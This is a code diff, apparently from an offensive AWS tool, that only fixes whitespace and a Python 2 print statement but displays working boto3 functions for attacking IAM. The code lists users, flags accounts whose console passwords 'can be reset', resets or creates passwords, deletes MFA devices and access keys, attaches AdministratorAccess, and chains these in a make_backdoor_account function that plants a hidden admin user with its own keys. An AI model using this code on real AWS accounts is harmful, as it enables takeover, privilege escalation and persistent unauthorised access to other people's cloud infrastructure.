@@ -17,7 +17,7 @@ region = 'us-east-1'
 
 def check_root_account(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY):
     client = boto3.client('iam', aws_access_key_id=AWS_ACCESS_KEY_ID, aws_secret_access_key=AWS_SECRET_ACCESS_KEY,region_name=region)
-    
+
     try:
         acct_summary = client.get_account_summary()
         if acct_summary:
@@ -28,18 +28,18 @@ def check_root_account(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY):
         if client_list:
             print("Printing Users")
             pp.pprint(client_list['Users'])
-        
+
         print("Checking for console access")
         for user in client_list['Users']:
-            
+
             try:
                 profile = client.get_login_profile(UserName=user['UserName'])
                 if profile:
                     print('User {} likely has console access and the password can be reset :-)' .format(user['UserName']))
                     print("Checking for MFA on account")
                     mfa = client.list_mfa_devices(UserName=user['UserName'])
-                    print mfa['MFADevices']
-            
+                    print(mfa['MFADevices'])
+
             except botocore.exceptions.ClientError as e:
                 if e.response['Error']['Code'] == 'NoSuchEntity':
                     print("[-]: user '{}' likely doesnt have console access" .format(user['UserName']))
@@ -55,10 +55,10 @@ def check_root_account(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY):
             print("Unexpected error: {}" .format(e))
     except KeyboardInterrupt:
         print("CTRL-C received, exiting...")
-    
+
 def change_user_console_password(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, username, password):
     client = boto3.client('iam', aws_access_key_id = AWS_ACCESS_KEY_ID, aws_secret_access_key = AWS_SECRET_ACCESS_KEY, region_name=region)
-    
+
     try:
         response = client.update_login_profile(UserName=username,Password=password, PasswordResetRequired=False)
         print('Changing password for user: {} to password: {}' .format(username, password))
@@ -76,7 +76,7 @@ def change_user_console_password(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, usern
 
 def create_user_console_password(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, username, password):
     client = boto3.client('iam', aws_access_key_id = AWS_ACCESS_KEY_ID, aws_secret_access_key = AWS_SECRET_ACCESS_KEY, region_name=region)
-    
+
     try:
         response = client.create_login_profile(UserName=username,Password=password, PasswordResetRequired=False)
         print('Changing password for user: %s to password: {}' .format(username, password))
@@ -94,7 +94,7 @@ def create_user_console_password(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, usern
 
 def get_password_policy(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY):
     client = boto3.client('iam', aws_access_key_id = AWS_ACCESS_KEY_ID, aws_secret_access_key = AWS_SECRET_ACCESS_KEY, region_name=region)
-    
+
     try:
         pass_policy = client.get_account_password_policy()
         print("Account Password Policy:")
@@ -106,7 +106,7 @@ def get_password_policy(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY):
 
 def create_user(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, username):
     client = boto3.client('iam', aws_access_key_id=AWS_ACCESS_KEY_ID, aws_secret_access_key=AWS_SECRET_ACCESS_KEY, region_name=region)
-    
+
     try:
         print("Creating a new IAM user named: {}" .format(username))
         create_user = client.create_user(Path='/',UserName=username)
@@ -123,7 +123,7 @@ def create_user(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, username):
 
 def create_access_key(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, username):
     client = boto3.client('iam', aws_access_key_id=AWS_ACCESS_KEY_ID, aws_secret_access_key=AWS_SECRET_ACCESS_KEY, region_name=region)
-    
+
     try:
         create_access_key = client.create_access_key(UserName=username)
         print("Creating a new access key for: {}" .format(username))
@@ -135,7 +135,7 @@ def create_access_key(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, username):
 
 def delete_access_key(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, username, accesskey):
     client = boto3.client('iam', aws_access_key_id=AWS_ACCESS_KEY_ID, aws_secret_access_key=AWS_SECRET_ACCESS_KEY, region_name=region)
-    
+
     try:
         delete_access_key = client.delete_access_key(UserName=username, AccessKeyId=accesskey)
         print("Deleting a access key: {} for: {}" .format(accesskey, username))
@@ -166,7 +166,7 @@ def delete_mfa_device(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, username, mfaser
 
 def make_admin(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, username):
     client = boto3.client('iam', aws_access_key_id=AWS_ACCESS_KEY_ID, aws_secret_access_key=AWS_SECRET_ACCESS_KEY, region_name=region)
-    
+
     try:
         make_admin = client.attach_user_policy(UserName=username, PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
         print("Adding admin policy to: {}" .format(username))
@@ -189,7 +189,7 @@ def make_backdoor_account(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, username, pa
         make_admin(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY,username)
         create_user_console_password(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, username, password)
         create_access_key(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY,username)
-            
+
     except botocore.exceptions.ClientError as e:
         print("Unexpected error: {}" .format(e))
     except KeyboardInterrupt:
